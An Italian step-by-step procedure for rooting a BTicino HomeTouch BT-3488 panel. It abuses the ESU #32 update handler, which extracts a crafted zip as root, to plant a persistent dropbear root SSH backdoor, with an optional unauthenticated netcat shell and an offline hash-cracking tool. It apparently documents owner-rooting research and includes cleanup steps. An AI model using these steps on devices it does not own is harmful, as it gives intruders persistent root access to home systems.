# Procedura dettagliata: root su HomeTouch BT-3488 via ESU #32

> **Avviso**: Questo documento descrive la procedura tecnica. Alcuni passaggi richiedono l'accesso
> al dispositivo fisico o via rete. Nessuna credenziale reale è inclusa.

## 1. Identificazione e accesso preliminare

```bash
# Verificare di avere il device giusto (non MyHomeServer1)
# La porta 22000 e le porte 22/2222 distinguono i dispositivi

# Verifica OPEN password (usa puma_ng.exe sulla porta seriale/USB)
# Sostituire <DEVICE_IP> e <OPEN_PASSWORD> con i valori del proprio device
puma_ng.exe ck -e <DEVICE_IP> <OPEN_PASSWORD>
# Atteso: @@@ ok 200 4 3.2.5 @@@

# Scarica la configurazione reale del device
# Sostituire <DEVICE_IP> e <OPEN_PASSWORD> con i valori del proprio device
puma_ng.exe cd conf.xml -e <DEVICE_IP> <OPEN_PASSWORD>
# Questo salva conf.xml sul PC (4649 byte)
```

## 2. Costruzione del payload

```bash
# Pulizia preliminare: verificare che non ci siano residui
# build_payload.py usa conf.xml scaricato come input

# Genera lo zip payload con password (consigliato: senza chiave SSH)
python build_payload.py --password "<ROOT_PASSWORD>" --no-key
```

Output atteso:
```
conf.xml      : 4511 byte
fw            : 3.2.5
modalita'     : dropbear su 2222 (password)
password ssh  : abilitata (hash $5$ generato)
symlink       : pmd5c9e -> /home/bticino/cfg/extra
marker link   : m348f90 -> /var/tmp/ftp

stage1.zip    : 1669 byte  cksum=1829700747
stage2.zip    : 23123 byte cksum 3632328286
```

### Opzioni di build_payload.py

| Opzione | Effetto |
|---|---|
| `--password <p>` | Abilita login password su dropbear (porta 2222) |
| `--no-key` | Non includere authorized_keys (sola password) |
| `--ssh-key <k>` | Includere chiave pubblica (deve essere senza passphrase) |
| `--netcat` | Modalità netcat (senza autenticazione) |
| `--out-dir <d>` | Directory di output (default: payload/work/payload/) |

## 3. Apply a due stadi

```bash
# Eseguire l'applay; gli script retry automatici
python apply_2stage.py --max-retry 3
```

### Cosa succede durante l'applay

1. Viene inviato il frame `#32 <size> 0 <cksum> ##` al device
2. L'handler ESU verifica `size` e `cksum` (POSIX cksum, non zlib.crc32)
3. Viene eseguito `unzip` come root all'interno di `/var/tmp/`
4. Gli symlink differiti vengono creati alla fine dell'estrazione
5. Se il `conf.xml` contiene modifiche, queste vengono applicate

### Gestione dei retry

- Il primo `#32` può far morire `bt_device` prima/durante l'unzip (scrittura parziale)
- `apply_2stage.py` rileva la mancanza del marker e riprova il ciclo completo
- `--max-retry 3` significa che lo script prova fino a 3 cicli interi
- Dopo un apply riuscito, compare un file marker (es. `PAYLOAD_OK.txt`)

## 4. Riavvio e verifica

```bash
# Riavviare il dispositivo in modo controllato
python reboot_hometouch.py
```

Dopo il boot, attendere ~10-15 secondi affinché la porta 2222 diventi raggiungibile.

### Verifica accesso root

```bash
# Verifica parametrica via Python/paramiko
python check_root.py --password "<ROOT_PASSWORD>"

# Oppure accesso SSH diretto
ssh -p 2222 root@<DEVICE_IP>
# oppure (stessa password)
ssh -p 22 root@<DEVICE_IP>
```

Output atteso: `uid=0(root) gid=0(root) groups=0(root)`

## 5. Rotazione password (senza rigenerare lo zip)

```bash
# Scrivere nuovo hash in .pwn_hash sul device
python set_password.py --password "<NEW_ROOT_PASSWORD>" \
    --ssh <DEVICE_IP> --old-password "<CURRENT_ROOT_PASSWORD>" --reboot
```

Funzionamento:
- Lo script genera un hash `$5$` con salt casuale
- Scrive `printf '%s\n' '$5$...' > /home/bticino/cfg/extra/.pwn_hash`
- `pwn.sh`, al prossimo avvio, legge questo file e usa quell'hash al posto di quello compilato
- Per tornare all'hash compilato: `python set_password.py --clear --ssh <DEVICE_IP> --old-password "<CURRENT_ROOT_PASSWORD>"`

### Importante: apici singoli

L'hash deve essere scritto con apici singoli per evitare espansione shell:
```bash
printf '%s\n' '$5$<hash_da_includere>' > .pwn_hash
```
Con apici doppi, la shell espanderebbe i `$` come variabili, corrompendo l'hash.

## 6. Chiave SSH (opzionale, richiede assenza passphrase)

```bash
# 1. Generare chiave senza passphrase
ssh-keygen -t ed25519 -f $HOME/.ssh/id_hometouch

# 2. Includere nel payload
python build_payload.py --password "<ROOT_PASSWORD>" --ssh-key ~/.ssh/id_hometouch.pub

# 3. Verificare ownership (pwn.sh si occupa di chown 0:0 automaticamente)
#    Ma se si aggiunge la chiave manualmente dopo:
chown 0:0 /home/bticino/cfg/extra/.ssh
chown 0:0 /home/bticino/cfg/extra/.ssh/authorized_keys
```

> **Nota**: La chiave installata nei primi test aveva una passphrase sconosciuta e non era
> utilizzabile. Il payload definitivo si genera con `--no-key` (sola password).

## 7. Risoluzione problemi

| Sintomo | Causa probabile | Azione |
|---|---|---|
| Porta 2222 in timeout | pwn.sh non partito, o porta non ancora aperta | Attendere 10-15s dopo boot; controllare .license_ver |
| Password rifiutata | Hash espansi dai doppi apici, o .pwn_hash non presente | Usare apici singoli; verificare .pwn_hash |
| Permission denied (publickey) | Chiave con passphrase, o authorized_keys non di root | Generare chiave senza passphrase; chown 0:0 |
| apply_2stage.py: ConnectionAbortedError | Normale: l'apply con conf.xml reale riavvia bt_device | Nessuna: lo script si riconnette da solo (§19.5) |
| Marker assente dopo retry | Scrittura parziale dello zip | Riavviare da zero: rebuild + apply + reboot |

## 8. Ripristino

Per rimuovere il payload e ripristinare lo stato originale:

```bash
# Sul device, come root:
rm -f /home/bticino/cfg/extra/usbkey_dir/lib/libpwn.so
rm -f /home/bticino/cfg/extra/usbkey_dir/lib/libutils.so.1
rm -f /home/bticino/cfg/extra/pwn.sh
rm -f /home/bticino/cfg/extra/.pwn_hash    # rimuove override password
sync
```

Dopo il riavvio, il dispositivo torna allo stato precedente (l'override di /etc/shadow vive in tmpfs).

## File chiave del progetto

- `build_payload.py`: costruzione dello zip payload
- `apply_2stage.py`: apply a due stadi con retry
- `check_root.py`: verifica accesso root via SSH
- `pwn.sh`: payload v8 (dropbear + diagnostica)
- `set_password.py`: rotazione password via .pwn_hash
- `sha256crypt.py`: generazione/verifica hash $5$
- `crack_shadow.py`: attacco offline hash $5$
